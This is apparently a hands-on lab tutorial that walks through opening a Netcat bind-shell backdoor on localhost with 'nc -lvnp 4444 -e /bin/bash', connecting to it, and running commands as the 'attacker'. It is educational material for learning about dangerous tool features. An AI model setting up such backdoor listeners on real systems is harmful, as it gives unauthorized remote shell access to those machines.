# Understanding Netcat

Netcat (or `nc`) is a command-line utility for reading from and writing to network connections using TCP or UDP. It is often called the "Swiss-army knife for TCP/IP" because of its versatility. In this lab, the setup script has already installed a version of Netcat that is suitable for our purpose.

First, let's verify that Netcat is installed and view its help menu. This will show us the available options.

Run the following command in your terminal:

```bash
nc -h
```

You should see a list of command options. The output will look similar to this (versions may vary):

```plaintext
[v1.10-41]
connect to somewhere:	nc [-options] hostname port[s] [ports] ...
listen for inbound:	nc -l -p port [-options] [hostname] [port]
options:
	-c shell commands	as `-e'; use /bin/sh to exec [dangerous!!]
	-e filename		program to exec after connect [dangerous!!]
	-b			allow broadcasts
...
```

Pay close attention to the `-e` and `-c` options. The output explicitly marks them as "dangerous". This is because they allow you to execute a program, such as a command shell, and connect it to a network port. This is the exact feature we will use to create our backdoor. Understanding why a tool's features are considered dangerous is a key part of learning cybersecurity.

# Creating the Backdoor Listener

In this step, you will configure one terminal to act as the "victim" machine. This machine will run a Netcat listener that waits for an incoming connection. When a connection is made, it will grant the person connecting a command shell, effectively creating a backdoor.

We will use port `4444` for this exercise. Ports are communication endpoints that allow different services on a machine to be accessed over a network.

In your current terminal, run the following command to start the listener:

```bash
nc -lvnp 4444 -e /bin/bash
```

Let's break down this command:

- `-l`: Puts Netcat in listen mode, waiting for incoming connections.
- `-v`: Enables verbose mode, providing more details about the connection.
- `-n`: Tells Netcat to use numeric IP addresses instead of resolving hostnames, which can be faster.
- `-p 4444`: Specifies the port to listen on, in this case, port `4444`.
- `-e /bin/bash`: This is the most critical part. It tells Netcat to execute the `/bin/bash` program (the Bash shell) and connect its input and output to the network socket as soon as a client connects.

After running the command, your terminal will display a message indicating that it is listening and will then appear to hang. This is normal. It is now waiting for a connection.

```plaintext
listening on [any] 4444 ...
```

Do not close this terminal. We will refer to this as the **victim terminal**. You will need to open a new terminal for the next step.

# Connecting to the Backdoor

Now you will play the role of the "attacker". You will open a new terminal and use Netcat to connect to the listener you started in the previous step. Since both the "victim" and "attacker" are on the same machine in this lab, you will connect to the localhost IP address, which is `127.0.0.1`.

First, open a new terminal. You can do this by right-clicking in the terminal area and selecting "New Tab" or using the shortcut `Ctrl+Shift+T`. We will refer to this new terminal as the **attacker terminal**.

In the new **attacker terminal**, run the following command to connect to the listener:

```bash
nc 127.0.0.1 4444
```

After you run this command, you will see a connection message in the **victim terminal**:

```plaintext
connect to [127.0.0.1] from (UNKNOWN) [127.0.0.1] 33333
```

_(The port number `33333` will be a random high-numbered port)_

Your **attacker terminal** will now have a blinking cursor, but no prompt. This is because you are now inside the Bash shell that is running on the **victim terminal**. You have successfully established a remote shell. Any command you type here will be executed on the "victim" machine.

# Executing Remote Commands

You now have a remote shell. Let's test it by running some commands from the **attacker terminal**. These commands will be executed within the context of the **victim terminal**.

In the **attacker terminal**, type the following command and press Enter:

```bash
whoami
```

The output will be `labex`, which is the user account of the victim shell.

```plaintext
labex
```

Now, let's find out the current working directory of the remote shell:

```bash
pwd
```

The output will show the home directory of the `labex` user.

```plaintext
/home/labex/project
```

To prove that you have control, let's create a file on the "victim" system. Run this command in the **attacker terminal**:

```bash
echo "Backdoor was here" > /tmp/proof.txt
```

This command creates a file named `proof.txt` in the `/tmp` directory with some text inside it. You will not see any output.

Now, let's verify the file was created. In the **attacker terminal**, read the file's content:

```bash
cat /tmp/proof.txt
```

You should see the text you just wrote:

```plaintext
Backdoor was here
```

![Remote command execution successful](https://file.labex.io/namespace/df87b950-1f37-4316-bc07-6537a1f2c481/cybersecurity/lab-build-a-backdoor-in-netcat/en/screenshot-20250828-WuX8NKan@2x.png)

You have successfully executed commands remotely and modified the victim's filesystem. To end the session, you can press `Ctrl+C` in the **attacker terminal**. This will close the connection, and the Netcat listener process in the **victim terminal** will also terminate.